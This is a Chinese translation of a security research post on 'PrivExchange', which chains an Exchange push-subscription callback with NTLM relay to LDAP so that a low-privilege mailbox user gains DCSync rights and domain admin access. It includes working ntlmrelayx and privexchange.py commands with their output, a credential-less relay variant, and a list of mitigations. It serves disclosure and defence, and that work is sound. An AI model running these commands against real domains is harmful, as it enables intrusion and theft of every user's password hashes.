> 原文链接: https://www.anquanke.com//post/id/170199 


# 船新版本的Exchange Server提权漏洞分析


                                阅读量   
                                **299880**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者dirkjanm，文章来源：dirkjanm.io
                                <br>原文地址：[https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t01b2937d0b2ce8c915.png)](https://p3.ssl.qhimg.com/t01b2937d0b2ce8c915.png)



在多数使用Active Directory和Exchange的组织中，Exchange服务器通常具有很高的权限，Exchange服务器上的管理员可以升级为域管理员。最近我看了一份来自于ZDI的文章(CVE-2018-8581的技术细节及其利用方式)，其中详细介绍了一种通过HTTP使用NTLM向攻击者进行交换身份验证的方法。但我认为漏洞的危害不止于此，我们还可以将其与NTLM中继攻击相结合，使得用户可以低权限(任意拥有邮箱的用户)提权到域管理员。在默认情况下，我见过使用Exchange的组织有90%都会受到该攻击的威胁，并且在我写下这篇文章的时候还没有相应的patch，暂时只能通过一些缓解措施来防止此权限升级。本文详细介绍了攻击方法，一些更具技术性的细节和相应的缓解措施，以及POC。我将本次攻击称为”PrivExchange”



## 通过新方式组合已知漏洞

本文将一些已知的漏洞和已知的协议弱点结合成一个新的攻击方法。一共有3个部分组合起来，可以从低权限提权(任意拥有邮箱的用户)到域管理员访问权限：
1. 默认情况下，Exchange Server具有过高的权限
1. NTLM身份验证容易受到中继攻击
1. Exchange具有一项功能，可以使用Exchange服务器的计算机帐户对攻击者进行身份验证


## 一、交换和高权限

此处的主要漏洞是Exchange在Active Directory域中具有高权限。该`Exchange Windows Permissions`组可以以`WriteDacl`的权限来访问Active Directory中的Domain对象，该对象允许该组的任何成员修改域权限，其中包括执行DCSync操作的权限。具有此权限的用户或计算机可以执行域控制器通常用于复制的同步操作，这允许攻击者同步Active Directory中用户的所有哈希密码。一些研究人员已经介绍了这一点（参见本文末尾的参考文献部分），我去年与我的Fox-IT同事Rindert一起写过这篇文章。在那篇文章中，我还发布了对ntlmrelayx的更新([https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)，](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)%EF%BC%8C) 这增加了在NTLM中继时执行这些基于访问控制列表(ACL)的攻击的可能性。



## NTLM中继攻击

NTLM中继攻击并不是一种新的攻击手法。以前，我们主要关注的是通过SMB转发NTLM身份验证，以此来在其他主机上执行代码。但遗憾的是，大多数公司网络并未启用SMB签名，因此我们不能通过该方法进行攻击。但我们可以试试其他协议，其他协议也容易受到中继攻击。在我看来，最有意思的协议是LDAP，它可以用来读取和修改(Active)目录中的对象。你可以访问该链接复习一下NTLM中继攻击([https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/)。](https://www.fox-it.com/en/insights/blogs/blog/inside-windows-network/)%E3%80%82) 简易的攻击流程是，在没有进行相关的配置来阻止攻击的情况下，我们可以通过Windows(或自动地)将攻击者的计算机连接到网络中的其他计算机时执行(自动)身份验证，如下图所示：

[![](https://p0.ssl.qhimg.com/t01933b3d9c243d54de.png)](https://p0.ssl.qhimg.com/t01933b3d9c243d54de.png)

当身份验证进行到LDAP这一步时，可以修改目录中的对象来授予攻击者权限，包括DCSync操作所需的权限。

因此，如果我们可以让Exchange服务器通过NTLM身份验证向我们进行身份验证，我们就可以执行ACL攻击。注意，仅当受害者通过HTTP而不是通过SMB对我们进行身份验证时，才能中继到LDAP。（将在技术详解一节中详细阐述）



## 让Exchange进行身份验证

到目前为止，唯一缺少的部分是让Exchange对我们进行身份验证的简单方法。ZDI研究员发现可以通过Exchange PushSubscription功能使Exchange通过HTTP对任意URL进行身份验证。在他们的文章中([https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange](https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange)) 他们使用此漏洞将NTLM身份验证中继回Exchange(这称为反射攻击)并冒充其他用户。如果我们将此与默认情况下Exchange具有的高权限相结合并执行中继攻击而不是反射攻击，我们可以使用这些权限为自己授予DCSync权限。推送通知服务有一个选项，即每隔X分钟发送一条消息(攻击者可以指定X)，即使没有发生任何事件，即使收件箱中没有新来信，也可以确保Exchange连接到我们。



## 执行权限提升攻击

下面显示了上述攻击的示意图，显示了为升级权限而执行的步骤：

[![](https://p1.ssl.qhimg.com/t01fd2740d19b45b983.png)](https://p1.ssl.qhimg.com/t01fd2740d19b45b983.png)

我们需要两个工具来执行攻击，`privexchange.py`([https://github.com/dirkjanm/privexchange/)和`ntlmrelayx`(https://github.com/SecureAuthCorp/impacket/)。](https://github.com/dirkjanm/privexchange/)%E5%92%8C%60ntlmrelayx%60(https://github.com/SecureAuthCorp/impacket/)%E3%80%82) 以域控制器上的LDAP作为目标，以中继模式启动ntlmrelayx，对攻击者所控制的ntu用户进行提权操作：

```
ntlmrelayx.py -t ldap://s2016dc.testsegment.local --escalate-user ntu
```

现在我们运行privexchange.py脚本：

```
user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u ntu -d testsegment.local
Password: 
INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
INFO: Exchange returned HTTP status 200 - authentication was OK
ERROR: The user you authenticated with does not have a mailbox associated. Try a different user.
```

当与没有邮箱的用户一起运行时，我们将收到上述错误。我们再次尝试与有邮箱的用户：

```
user@localhost:~/exchpoc$ python privexchange.py -ah dev.testsegment.local s2012exc.testsegment.local -u testuser -d testsegment.local 
Password: 
INFO: Using attacker URL: http://dev.testsegment.local/privexchange/
INFO: Exchange returned HTTP status 200 - authentication was OK
INFO: API call was successful
```

一分钟后(我们所设定的值)，我们看到ntlmrelayx的连接，它为我们的用户提供DCSync权限：

[![](https://p1.ssl.qhimg.com/t016a9a5076e6eed010.png)](https://p1.ssl.qhimg.com/t016a9a5076e6eed010.png)

我们使用secretsdump确认DCSync权限已到位：

[![](https://p4.ssl.qhimg.com/t015ddcc67ae883bcf2.png)](https://p4.ssl.qhimg.com/t015ddcc67ae883bcf2.png)

通过获取到的所有Active Directory用户的哈希密码，攻击者可以创建冒充任何用户的tickets，或使用任何用户密码哈希通过任何接受域中的NTLM或Kerberos的身份验证。



## 技术详解：中继到LDAP和签名

前文提到过，我们无法通过SMB将认证凭证中转到LDAP，因此我们无法使用最近公布的SpoolService RPC滥用([https://github.com/leechristensen/SpoolSample/](https://github.com/leechristensen/SpoolSample/)) 技术来进行攻击（因为SpoolService RPC使用的是基于SMB的认证过程）。这方面的问题一直在出现，我将会详细解释为什么会这样。如果你不想深入了解NTLM身份验证，请跳过本节。

SMB和HTTP中的NTLM身份验证之间的区别在于默认协商的标志。关键点在于`NTLMSSP_NEGOTIATE_SIGN` flag（0x00000010），关于这个标志，可查看该网站([https://msdn.microsoft.com/en-us/library/cc236650.aspx)。](https://msdn.microsoft.com/en-us/library/cc236650.aspx)%E3%80%82) 默认情况下，HTTP上的NTLM身份验证不会设置此标志，但如果在SMB上使用此标志，则默认情况下将设置此标志：

[![](https://p3.ssl.qhimg.com/t01c1a7423ed85b646b.png)](https://p3.ssl.qhimg.com/t01c1a7423ed85b646b.png)

当我们将此数据包中继到LDAP时，将成功完成身份验证，但LDAP期望使用从密码派生的会话密钥（中继攻击中没有该密码，因此也不会有该密钥）对所有消息进行签名。因此，LDAP将忽略没有签名的任何消息，从而导致我们的攻击失败。是否可能在传输过程中修改这些标志，这样就不会进行签名协商。这在现在的Windows中不起作用，因为它们默认包含MIC(消息完整性检查)，这是基于全部的3个NTLM消息的签名，因此任何消息中的任何修改都会使其失效。

[![](https://p4.ssl.qhimg.com/t01eb3c211ca072034d.png)](https://p4.ssl.qhimg.com/t01eb3c211ca072034d.png)

我们可以删除MIC吗？可以，因为它不在NTLM消息的受保护部分。然而，在NTLM身份验证（仅限NTLMv2）中有一种保护机制可以防止这种情况发生：在NTLMv2响应包中，它使用受害者的密码签名，包含一个`AV_PAIR`结构`MsvAvFlags`。当此字段值为0x0002时，表示客户端发送的`type 3`消息包含MIC字段。

[![](https://p2.ssl.qhimg.com/t01ca8aee9f1f7999e8.png)](https://p2.ssl.qhimg.com/t01ca8aee9f1f7999e8.png)

修改NTLMv2响应会使身份验证无效，因此我们也无法删除此标志字段。该标志字段表示在认证过程中计算并包含MIC，这将使目标服务器对MIC进行验证，进而验证所有3条消息在传输过程中是否被修改，因此我们无法删除签名标志。

我认为这种情况只适用于Microsoft实现的NTLM。实现NTLM的自定义设备的安全性很可能不会到添加MIC和`AV_PAIR`标志的级别，这让它们容易存在标志被修改的威胁，从而使SMB-&gt; LDAP中继成为可能。这种情况的一个例子是NTLM 的Java实现，它可以在传输过程中进行修改以绕过安全措施。



## 在没有任何凭据的情况下执行攻击

在上一节中，我们使用受损凭据来执行攻击的第一步。但如果攻击者只能执行网络攻击却没有任何凭据，我们依然可以触发Exchange进行身份验证。

如果我们执行SMB到HTTP（或HTTP到HTTP）中继攻击（使用LLMNR / NBNS / mitm6欺骗），我们可以将同一网段中用户的身份验证中继到Exchange EWS并使用其凭据触发回调。我已经编写好一个小攻击脚本`httpattack.py`，通过它我们可以使用ntlmrelayx从网络角度执行攻击而无需任何凭据(需要在代码中修改攻击目标host)：

[![](https://p0.ssl.qhimg.com/t0177d0cafb239bffa1.png)](https://p0.ssl.qhimg.com/t0177d0cafb239bffa1.png)



## 缓解措施

此攻击取决于各种组件的工作，适用于此次攻击的最重要的缓解措施是：
- 删除Exchange对Domain对象所具有的不必要的高权限（请参考下面的链接）。
- 启用LDAP签名并启用LDAP通道绑定([https://support.microsoft.com/en-us/help/4034879/how-to-add-the-ldapenforcechannelbinding-registry-entry)，](https://support.microsoft.com/en-us/help/4034879/how-to-add-the-ldapenforcechannelbinding-registry-entry)%EF%BC%8C) 以防止LDAP中继攻击和LDAPS中继攻击
- 阻止Exchange服务器与任意端口上的工作站建立连接。
- 在IIS中的Exchange端点上启用身份验证扩展保护机制([https://msdn.microsoft.com/en-us/library/dd767318%28v=vs.90%29.aspx](https://msdn.microsoft.com/en-us/library/dd767318%28v=vs.90%29.aspx)) （但不要在Exchange后端使用，这将影响Exchange的正常使用）。该机制可以验证NTLM身份验证中的通道绑定参数，该参数将NTLM身份验证与TLS连接联系起来，并阻止攻击者向Exchange Web服务发起中继攻击。
<li>删除注册表项，这样可以将中继返回到Exchange服务器，如微软对于CVE-2018-8518的防御方法([https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581)中所述。](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581)%E4%B8%AD%E6%89%80%E8%BF%B0%E3%80%82)
</li>
- 在Exchange服务器上启用SMB签名（最好域中的所有其他服务器和工作站都启用该机制），以防止对SMB的跨协议中继攻击。


## 相关工具&amp;受影响的版本

POC:[https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)<br>
已在以下Exchange/Windows版本上进行了测试：
- Exchange 2013 (CU21)，Server 2012R2，中继至Server 2016 DC（所有产品已打补丁）
<li>Exchange 2016 (CU11)，Server 2016，中继至Server 2019 DC（所有产品已打补丁）<br>
上述两个Exchange服务器都是使用共享权限模式（默认设置）安装的，但根据这篇文章([https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)，](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md)%EF%BC%8C) RBAC权限分离部署也很容易受到攻击（但我没有对此进行过测试）。</li>
<li>
</li>
## 参考文献

### <a class="reference-link" name="%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"></a>缓解措施
- 使用powershell删除Exchange危险权限([https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1](https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/Fix-DomainObjectDACL.ps1))
- 识别和删除危险的Exchange权限([https://www.blackhat.com/docs/webcast/04262018-Webcast-Toxic-Waste-Removal-by-Andy-Robbins.pdf](https://www.blackhat.com/docs/webcast/04262018-Webcast-Toxic-Waste-Removal-by-Andy-Robbins.pdf))
- ACL提权研究([https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf](https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf))
### <a class="reference-link" name="NTLM%E4%B8%AD%E7%BB%A7/%E7%AD%BE%E5%90%8D%E6%9C%BA%E5%88%B6"></a>NTLM中继/签名机制
- NTLM反射攻击的研究进展([https://github.com/SecureAuthCorp/impacket/issues/451](https://github.com/SecureAuthCorp/impacket/issues/451))
- NTLM SMB到LDAP的中继攻击([https://github.com/SecureAuthCorp/impacket/pull/500](https://github.com/SecureAuthCorp/impacket/pull/500))
- 处理中继凭证([https://www.secureauth.com/blog/playing-relayed-credentials](https://www.secureauth.com/blog/playing-relayed-credentials))
### <a class="reference-link" name="%E5%85%B6%E4%BB%96%E5%8F%82%E8%80%83"></a>其他参考
- MS-NLMP([https://msdn.microsoft.com/en-us/library/cc236621.aspx](https://msdn.microsoft.com/en-us/library/cc236621.aspx))
- ZDI关于Exchange该漏洞的详细分析([https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange](https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange))
- 如何通过中心主机远程中继([https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/))